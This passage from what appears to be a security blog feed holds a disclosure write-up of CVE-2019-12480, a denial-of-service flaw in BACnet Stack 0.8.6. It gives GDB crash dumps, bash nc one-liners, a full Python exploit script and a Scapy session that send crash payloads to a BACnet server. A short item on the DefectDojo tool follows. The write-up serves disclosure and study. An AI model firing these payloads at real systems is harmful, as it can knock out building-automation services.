  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3223&quot;&gt;https://sourceforge.net/p/bacnet/code/3223&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3224&quot;&gt;https://sourceforge.net/p/bacnet/code/3224&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3225&quot;&gt;https://sourceforge.net/p/bacnet/code/3225&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;faults-analysis&quot;&gt;Faults analysis&lt;/h1&gt;

&lt;p&gt;During some fuzzing tests were detected a segmentation fault in the following services:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Device Communication Control&lt;/li&gt;
  &lt;li&gt;Atomic Read File&lt;/li&gt;
  &lt;li&gt;Atomic Write File&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;fault-in-device-communication-control-service&quot;&gt;Fault in Device Communication Control Service&lt;/h2&gt;

&lt;p&gt;Stack and GDB output for segmentation fault in the Device Communication Control service:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
Signal si_signo: 11 Signal si_addr: 2154041910
Nearby code:
   0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
   0x0000000000413751 &amp;lt;+22&amp;gt;:    xor    eax,eax
   0x0000000000413753 &amp;lt;+24&amp;gt;:    mov    rsi,rbp
   0x0000000000413756 &amp;lt;+27&amp;gt;:    mov    edi,0x426a0a
   0x000000000041375b &amp;lt;+32&amp;gt;:    call   0x401170 &amp;lt;printf@plt&amp;gt;
=&amp;gt; 0x0000000000413760 &amp;lt;+37&amp;gt;:    mov    al,BYTE PTR [rbp+0x0]
   0x0000000000413763 &amp;lt;+40&amp;gt;:    mov    dl,al
   0x0000000000413765 &amp;lt;+42&amp;gt;:    and    edx,0xfffffff0
   0x0000000000413768 &amp;lt;+45&amp;gt;:    cmp    dl,0xf0
   0x000000000041376b &amp;lt;+48&amp;gt;:    jne    0x413779 &amp;lt;decode_tag_number+62&amp;gt;
Stack trace:
#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  1 decode_is_context_tag at 0x413974 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  2 dcc_decode_service_request at 0x418428 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  3 handler_device_communication_control at 0x41e079 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Description: Access violation on source operand
Short description: SourceAv (19/22)
Hash: 0c6889881a5d7caa77aa0dbc2027317f.b3c82754609555d1d0273757f67cf6ca
Exploitability Classification: UNKNOWN
Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
Other tags: AccessViolation (21/22)

--- Info Frame ---

Stack level 0, frame at 0x7fffffffdc50:
 rip = 0x413760 in decode_tag_number; saved rip 0x413974
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc30, args: 
 Locals at 0x7fffffffdc30, Previous frame&apos;s sp is 0x7fffffffdc50
 Saved registers:
  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48

--- Info Registers ---

rax            0x12 18
rbx            0x7fffffffdc5f   140737488346207
rcx            0x11 17
rdx            0x0  0
rsi            0x0  0
rdi            0x7fffffffd700   140737488344832
rbp            0x80641236   0x80641236
rsp            0x7fffffffdc30   0x7fffffffdc30
r8             0x1  1
r9             0x7ffff7a5b14d   140737348219213
r10            0x65626d756e5f6761   7305521896678713185
r11            0x0  0
r12            0x7fffffffdd08   140737488346376
r13            0xc  12
r14            0x7fffffffdce0   140737488346336
r15            0x80641236   2154041910
rip            0x413760 0x413760 &amp;lt;decode_tag_number+37&amp;gt;
eflags         0x10206  [ PF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0

--- Backtrace ---


Thread 1 (Thread 0x7ffff7fe2740 (LWP 21011)):
#0  0x0000000000413760 in decode_tag_number ()
No symbol table info available.
#1  0x0000000000413974 in decode_is_context_tag ()
No symbol table info available.
#2  0x0000000000418428 in dcc_decode_service_request ()
No symbol table info available.
#3  0x000000000041e079 in handler_device_communication_control ()
No symbol table info available.
#4  0x00000000004134f7 in apdu_handler ()
No symbol table info available.
#5  0x000000000041c508 in npdu_handler ()
No symbol table info available.
#6  0x000000000040169a in main ()
No symbol table info available.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;fault-in-atomic-read-file-service&quot;&gt;Fault in Atomic Read File Service&lt;/h2&gt;

&lt;p&gt;Stack and GDB output for segmentation fault in the Atomic Read File service:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
Signal si_signo: 11 Signal si_addr: 18446744073168944418
Nearby code:
   0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
   0x0000000000413751 &amp;lt;+22&amp;gt;:    xor    eax,eax
   0x0000000000413753 &amp;lt;+24&amp;gt;:    mov    rsi,rbp
   0x0000000000413756 &amp;lt;+27&amp;gt;:    mov    edi,0x426a0a
   0x000000000041375b &amp;lt;+32&amp;gt;:    call   0x401170 &amp;lt;printf@plt&amp;gt;
=&amp;gt; 0x0000000000413760 &amp;lt;+37&amp;gt;:    mov    al,BYTE PTR [rbp+0x0]
   0x0000000000413763 &amp;lt;+40&amp;gt;:    mov    dl,al
   0x0000000000413765 &amp;lt;+42&amp;gt;:    and    edx,0xfffffff0
   0x0000000000413768 &amp;lt;+45&amp;gt;:    cmp    dl,0xf0
   0x000000000041376b &amp;lt;+48&amp;gt;:    jne    0x413779 &amp;lt;decode_tag_number+62&amp;gt;
Stack trace:
#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  1 decode_tag_number_and_value at 0x4137f9 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  2 arf_decode_service_request at 0x417df8 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  3 handler_atomic_read_file at 0x41d9ab in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Description: Access violation on source operand
Short description: SourceAv (19/22)
Hash: 39996a2c279b3763d9d7c9d644e36915.5dfb5ba5080de8d79c6b66b3f106b103
Exploitability Classification: UNKNOWN
Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
Other tags: AccessViolation (21/22)

--- Info Frame ---

Stack level 0, frame at 0x7fffffffdc50:
 rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc30, args: 
 Locals at 0x7fffffffdc30, Previous frame&apos;s sp is 0x7fffffffdc50
 Saved registers:
  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48

--- Info Registers ---

rax            0x11 17
rbx            0x7fffffffdc89   140737488346249
rcx            0x10 16
rdx            0x0  0
rsi            0x0  0
rdi            0x7fffffffd700   140737488344832
rbp            0xffffffffdfc6fd22   0xffffffffdfc6fd22
rsp            0x7fffffffdc30   0x7fffffffdc30
r8             0x1  1
r9             0x7ffff7a5b14d   140737348219213
r10            0x65626d756e5f6761   7305521896678713185
r11            0x0  0
r12            0xffffffffdfc6fd22   -540607198
r13            0x640f1b 6557467
r14            0x640f16 6557462
r15            0x11 17
rip            0x413760 0x413760 &amp;lt;decode_tag_number+37&amp;gt;
eflags         0x10206  [ PF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0

--- Backtrace ---


Thread 1 (Thread 0x7ffff7fe2740 (LWP 20992)):
#0  0x0000000000413760 in decode_tag_number ()
No symbol table info available.
#1  0x00000000004137f9 in decode_tag_number_and_value ()
No symbol table info available.
#2  0x0000000000417df8 in arf_decode_service_request ()
No symbol table info available.
#3  0x000000000041d9ab in handler_atomic_read_file ()
No symbol table info available.
#4  0x00000000004134f7 in apdu_handler ()
No symbol table info available.
#5  0x000000000041c508 in npdu_handler ()
No symbol table info available.
#6  0x000000000040169a in main ()
No symbol table info available.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;fault-in-atomic-write-file-service&quot;&gt;Fault in Atomic Write File Service&lt;/h3&gt;

&lt;p&gt;Stack and GDB output for segmentation fault in the Atomic Write File service:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
Signal si_signo: 11 Signal si_addr: 18446744072714559995
Nearby code:
   0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
   0x0000000000413751 &amp;lt;+22&amp;gt;:    xor    eax,eax
   0x0000000000413753 &amp;lt;+24&amp;gt;:    mov    rsi,rbp
   0x0000000000413756 &amp;lt;+27&amp;gt;:    mov    edi,0x426a0a
   0x000000000041375b &amp;lt;+32&amp;gt;:    call   0x401170 &amp;lt;printf@plt&amp;gt;
=&amp;gt; 0x0000000000413760 &amp;lt;+37&amp;gt;:    mov    al,BYTE PTR [rbp+0x0]
   0x0000000000413763 &amp;lt;+40&amp;gt;:    mov    dl,al
   0x0000000000413765 &amp;lt;+42&amp;gt;:    and    edx,0xfffffff0
   0x0000000000413768 &amp;lt;+45&amp;gt;:    cmp    dl,0xf0
   0x000000000041376b &amp;lt;+48&amp;gt;:    jne    0x413779 &amp;lt;decode_tag_number+62&amp;gt;
Stack trace:
#  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  1 decode_tag_number_and_value at 0x4137f9 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  2 awf_decode_service_request at 0x42062b in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  3 handler_atomic_write_file at 0x41dc13 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  4 apdu_handler at 0x4134f7 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  5 npdu_handler at 0x41c508 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
#  6 main at 0x40169a in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Faulting frame: #  0 decode_tag_number at 0x413760 in /home/fuzz/bacnet-stack-0.9.1/bin/bacserv
Description: Access violation on source operand
Short description: SourceAv (19/22)
Hash: 30f5f3fdb0db788098ed886be3d45933.f25bdc8062c3fd1d5fec8cfd4c618d89
Exploitability Classification: UNKNOWN
Explanation: The target crashed on an access violation at an address matching the source operand of the current instruction. This likely indicates a read access violation.
Other tags: AccessViolation (21/22)

--- Info Frame ---

Stack level 0, frame at 0x7fffffffdc50:
 rip = 0x413760 in decode_tag_number; saved rip 0x4137f9
 called by frame at 0x7fffffffdc80
 Arglist at 0x7fffffffdc30, args: 
 Locals at 0x7fffffffdc30, Previous frame&apos;s sp is 0x7fffffffdc50
 Saved registers:
  rbx at 0x7fffffffdc38, rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48

--- Info Registers ---

rax            0x11 17
rbx            0x7fffffffdc81   140737488346241
rcx            0x10 16
rdx            0x0  0
rsi            0x0  0
rdi            0x7fffffffd700   140737488344832
rbp            0xffffffffc4b1a1fb   0xffffffffc4b1a1fb
rsp            0x7fffffffdc30   0x7fffffffdc30
r8             0x1  1
r9             0x7ffff7a5b14d   140737348219213
r10            0x65626d756e5f6761   7305521896678713185
r11            0x0  0
r12            0xffffffffc4b1a1fb   -994991621
r13            0x640f1b 6557467
r14            0x640f16 6557462
r15            0x21 33
rip            0x413760 0x413760 &amp;lt;decode_tag_number+37&amp;gt;
eflags         0x10206  [ PF IF RF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0

--- Backtrace ---


Thread 1 (Thread 0x7ffff7fe2740 (LWP 20726)):
#0  0x0000000000413760 in decode_tag_number ()
No symbol table info available.
#1  0x00000000004137f9 in decode_tag_number_and_value ()
No symbol table info available.
#2  0x000000000042062b in awf_decode_service_request ()
No symbol table info available.
#3  0x000000000041dc13 in handler_atomic_write_file ()
No symbol table info available.
#4  0x00000000004134f7 in apdu_handler ()
No symbol table info available.
#5  0x000000000041c508 in npdu_handler ()
No symbol table info available.
#6  0x000000000040169a in main ()
No symbol table info available.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;exploits&quot;&gt;Exploits&lt;/h1&gt;

&lt;p&gt;Based on previous information were developed some exploits as Proof of concept.&lt;/p&gt;

&lt;h2 id=&quot;bash&quot;&gt;Bash&lt;/h2&gt;

&lt;p&gt;Device Communication Control payload:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne &apos;\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41&apos; | nc -u 192.168.10.10 47808
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Atomic Read File service payload:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne &apos;\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f&apos; | nc -u 192.168.10.10 47808
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Atomic Write File service payload:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne &apos;\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f&apos; | nc -u 192.168.10.10 47808
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;python&quot;&gt;Python&lt;/h2&gt;

&lt;p&gt;Using the output generated by the fuzzer and gdb could be possible to generate some POC exploits:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
# Exploit Author: mmorillo
# Vendor Homepage: https://sourceforge.net/p/bacnet/
# Software Link: https://sourceforge.net/projects/bacnet/files/bacnet-stack/bacnet-stack-0.8.6/
# Version: bacnet-stack-0.8.6
# Tested on: Linux
# CVE: CVE-2019-12480

#!/usr/bin/env python
# 
# After reported the bug to the vendor, sharing details
# about the vulnerability, as well as proof-of-concept code (exploit code to 
# test), has been release a fix for 0.8.7 release of 
# BACnet Protocol Stack https://sourceforge.net/p/bacnet/

import socket
import struct
import argparse
import os
import sys
from termcolor import colored

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
    parser = argparse.ArgumentParser(conflict_handler=&apos;resolve&apos;, add_help=True,
             description=&apos;BACnet Protocol Stack Segmentation fault leading to denial of service&apos;, version=&apos;0.1&apos;,
             usage=&quot;python %(prog)s&quot;)

    # Mandatory
    parser.add_argument(&apos;Server&apos;, type=str, help=&apos;BACnet server IP&apos;)
    parser.add_argument(&apos;Port&apos;, type=str, help=&apos;BACnet port&apos;)

    return parser


def get_Host_name_IP(): 
    try: 
        host_name = socket.gethostname() 
        host_ip = socket.gethostbyname(host_name) 
        return host_ip
    except: 
        print(&quot;Unable to get Hostname and IP&quot;) 


def target_alive(BACnetServer, BACnetPort):
    response = os.system(&quot;nc -u -z -w 1 &quot; + BACnetServer + &quot; &quot; + str(BACnetPort))

    if response == 0:
        return True
    else:
        return False

#------------------------------------------------------------------------------
# Main of program
#------------------------------------------------------------------------------

def main():

    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Get results line parser.
    results = parser.parse_args()

    BACnetServer = results.Server
    BACnetPort = int(results.Port)
    SRC_IP = get_Host_name_IP()

    if not target_alive(BACnetServer, BACnetPort):
        print((colored(&quot;[+] BACnet server down&quot;, &quot;yellow&quot;)))

    else:
        if target_alive(BACnetServer, BACnetPort):

            payload_DeviceCommunicationControl = &quot;\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41&quot;

            print((colored(&quot;[+] Sending BACnet DeviceCommunicationControl payload from &quot; + SRC_IP, &quot;green&quot;)))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack(&apos;&amp;gt;I&apos;,len(payload_DeviceCommunicationControl)))
            s.send(payload_DeviceCommunicationControl)

            print((colored(&quot;[+] Sent Payload: &quot; + payload_DeviceCommunicationControl.encode(&apos;hex&apos;) + &apos; to BACnet server &apos; + BACnetServer + &apos; port &apos; + str(BACnetPort), &quot;yellow&quot;)))

        if target_alive(BACnetServer, BACnetPort):

            payload_AtomicReadFile = &quot;\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f&quot;

            print((colored(&quot;[+] Sending BACnet AtomicReadFile payload from &quot; + SRC_IP, &quot;green&quot;)))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack(&apos;&amp;gt;I&apos;,len(payload_AtomicReadFile)))
            s.send(payload_AtomicReadFile)

            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicReadFile.encode(&apos;hex&apos;) + &apos; to BACnet server &apos; + BACnetServer + &apos; port &apos; + str(BACnetPort), &quot;yellow&quot;)))

        if target_alive(BACnetServer, BACnetPort):

            payload_AtomicWriteFile = &quot;\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f&quot;

            print((colored(&quot;[+] Sending BACnet AtomicWriteFile payload from &quot; + SRC_IP, &quot;green&quot;)))

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            s.connect((BACnetServer, BACnetPort))
            s.send(struct.pack(&apos;&amp;gt;I&apos;,len(payload_AtomicWriteFile)))
            s.send(payload_AtomicWriteFile)

            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicWriteFile.encode(&apos;hex&apos;) + &apos; to BACnet server &apos; + BACnetServer + &apos; port &apos; + str(BACnetPort), &quot;yellow&quot;)))

        if not target_alive(BACnetServer, BACnetPort):
            print((colored(&quot;[+] DoS completed&quot;, &quot;red&quot;)))


#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == &apos;__main__&apos;:
    main()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;scapy&quot;&gt;Scapy&lt;/h2&gt;

&lt;p&gt;Using the partially implemented &lt;a href=&quot;https://github.com/desolat/scapy-bacnet&quot;&gt;BACnet layer for Scapy&lt;/a&gt; can be generated the BLVC, NPDU and APDU layers in order to send the specific exploit octets. For example:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python
Python 2.7.16 (default, Apr  1 2019, 14:50:41)
[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.3)] on darwin
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; from bacnet import BvlcFunction, BVLC, BACNET_PORT, NPDU, NetworkLayerMessageType, hexStringToIntList, APDU, PduType, UnconfirmedServiceChoice
&amp;gt;&amp;gt;&amp;gt; from scapy.layers.inet import IP, UDP
&amp;gt;&amp;gt;&amp;gt; from scapy.all import *
&amp;gt;&amp;gt;&amp;gt; DST_IP = &apos;192.168.10.10&apos;
&amp;gt;&amp;gt;&amp;gt; SRC_PORT = 63491
&amp;gt;&amp;gt;&amp;gt; BACNET_PORT = 47808
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; udp = IP(dst=DST_IP) / UDP(sport=SRC_PORT, dport=BACNET_PORT)
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; bvlc = udp / BVLC(function=BvlcFunction.ORIGINAL_UNICAST_NPDU)
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; npdu = bvlc / NPDU(nlpci=0b00000100)
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; apdu = npdu / APDU(pdu_type=PduType.CONFIRMED_REQUEST,service_choice=UnconfirmedServiceChoice.DEVICECOMMUNICATIONCONTROL)  / Raw(&quot;\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41&quot;)
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; apdu.display()

###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = None
  src       = 192.168.10.5
  dst       = 192.168.10.10
  \options   \
###[ UDP ]###
     sport     = 63491
     dport     = bacnet
     len       = None
     chksum    = None
###[ BVLC ]###
        type      = 0x81
        function  = ORIGINAL_UNICAST_NPDU
        length    = None
###[ NPDU ]###
           version   = 1
           nlpci     = 4
###[ APDU ]###
              pdu_type  = CONFIRMED_REQUEST
              reserved  = 0
              max_response_segments= 0x5
              invoke_id = 0x1
              service_choice= DEVICECOMMUNICATIONCONTROL
###[ Raw ]###
                 load      = &apos;\r\xff\x80\x00\x03\x1a\n\x19\x00*\x00A&apos;

&amp;gt;&amp;gt;&amp;gt; send(apdu)
.
Sent 1 packets.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;segmentation-fault&quot;&gt;Segmentation Fault&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./bacserv
BACnet Server Demo
BACnet Stack Version 0.8.6
BACnet Device ID: 260001
Max APDU: 1476
DeviceCommunicationControl!
Violación de segmento (`core&apos; generado)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf&quot;&gt;135_2004&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Main_Page&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/&quot;&gt;The Free or Open Source Software BACnet Stack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/projects/bacnet/&quot;&gt;BACnet Protocol Stack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-12480&quot;&gt;NVD CVE-2019-12480 Details&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/61/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/61/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/62/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/62/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&quot;&gt;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3220&quot;&gt;https://sourceforge.net/p/bacnet/code/3220&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3223&quot;&gt;https://sourceforge.net/p/bacnet/code/3223&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3224&quot;&gt;https://sourceforge.net/p/bacnet/code/3224&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3225&quot;&gt;https://sourceforge.net/p/bacnet/code/3225&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ashrae.org/technical-resources/bookstore/bacnet&quot;&gt;BACnet ashrae&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rhyshaden.com/bacnet.htm&quot;&gt;BACnet rhyshaden resources&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Tue, 20 Aug 2019 00:00:00 +0100</pubDate>
        <link>https://1modm.github.io/CVE-2019-12480.html</link>
        <guid isPermaLink="true">https://1modm.github.io/CVE-2019-12480.html</guid>
        
        
      </item>
    
      <item>
        <title>DefectDojo</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/DefectDojo/django-DefectDojo&quot;&gt;&lt;strong&gt;DefectDojo&lt;/strong&gt;&lt;/a&gt; is a security program and vulnerability management tool. DefectDojo allows you to manage your application security program, maintain product and application information, schedule scans, triage vulnerabilities and push findings into defect trackers. Consolidate your findings into one source of truth with DefectDojo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/DefectDojo/Documentation/master/doc/img/screenshot1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is very easy to install and start to use:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/DefectDojo/django-DefectDojo
$ cd django-DefectDojo
$ ./setup.bash
$ ./run_dojo.bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For detailed documentation you can visit &lt;a href=&quot;https://defectdojo.readthedocs.io/en/latest/&quot;&gt;&lt;strong&gt;Read the Docs&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;One of the most powerful features is the complete Swagger API. In previous releases the API was created using Tastypie, available within each DefectDojo installation at /api/v1/doc/&lt;/p&gt;

&lt;p&gt;But now the API is created using Swagger for django, available within each DefectDojo installation at /api/v2/doc/&lt;/p&gt;

&lt;p&gt;Using a Token provided for each DefectDojo user and installation can be easily manage this Vulnerability Management Tool. The next examples can used as starting point in order to create our own integration tool, below you can see how to get all the products in our installation and how to upload reports for all the security tools and scanners integrated in DefectDojo.&lt;/p&gt;

